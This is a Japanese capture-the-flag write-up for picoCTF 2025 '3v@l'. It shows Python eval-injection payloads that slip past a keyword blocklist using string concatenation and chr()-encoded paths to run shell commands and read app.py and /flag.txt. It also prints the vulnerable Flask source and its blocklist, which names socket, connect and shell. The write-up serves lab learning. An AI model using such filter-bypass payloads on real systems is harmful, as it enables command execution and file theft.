# picoCTF2025　3v@l

## 概要
evalを使ったらjavascriptが実行できるのでいろいろ悪さをしようという感じ

## 解法
とりあえずlsする
```
__import__('os').system('ls -la')
```
結果、OSという単語、lsという単語が禁止ワードに含まれていた。
ついでにほぼflaskだろうということがわかった。

AIくんに頼んだらos使わない方法教えてくれた　がばい
```
__import__('o' + 's').system('echo *')
```
結果は以下のとおり
```
Result()
```
この世にファイルがないことがわかった。
ここで、フラグはソースコードに隠されていると考えて、ソースコードの露出を狙った。

```
__import__('o' + 's').system('grep "" app.py')
```
結果は以下の通り
```
Error: Detected forbidden keyword ''.
```
ダブルクォートもNGらしい

chr()でやる方法があるけど人力はめんどくさいのでgeminiにぶん投げる
```
open(chr(97)+chr(112)+chr(112)+chr(46)+chr(112)+chr(121)).read()
```

```python
from flask import Flask, request, render_template_string, render_template import re app = Flask(__name__) # Define blocklist keywords and regex for file paths BLOCKLIST_KEYWORDS = ['os', 'eval', 'exec', 'bind', 'connect', 'python','python3', 'socket', 'ls', 'cat', 'shell', 'bind'] FILE_PATH_REGEX = r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.' @app.route('/') def index(): return render_template('index.html/') @app.route('/execute', methods=['POST']) def execute(): code = request.form['code'] # Check for blocklist keywords in submitted code for keyword in BLOCKLIST_KEYWORDS: if keyword in code: return render_template('error.html', keyword=keyword) # Check for file path using regex if re.search(FILE_PATH_REGEX, code): return render_template('error.html') try: # Execute the Python code if no blocklist keyword or file path found result = eval(code) except Exception as e: result = f"Error: {str(e)}" return render_template('result.html', result=result) if __name__ == '__main__': app.run(debug=True, host="0.0.0.0", port=5000)
```
禁止ワードらしきものの羅列と禁止された記号がわかった。
がフラグは見えなかった。

ここでHintsを見ると、2番に
```
The flag file is /flag.txt
```
と記述があった。見逃し厳禁
```
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```
と送るとフラグを得れる。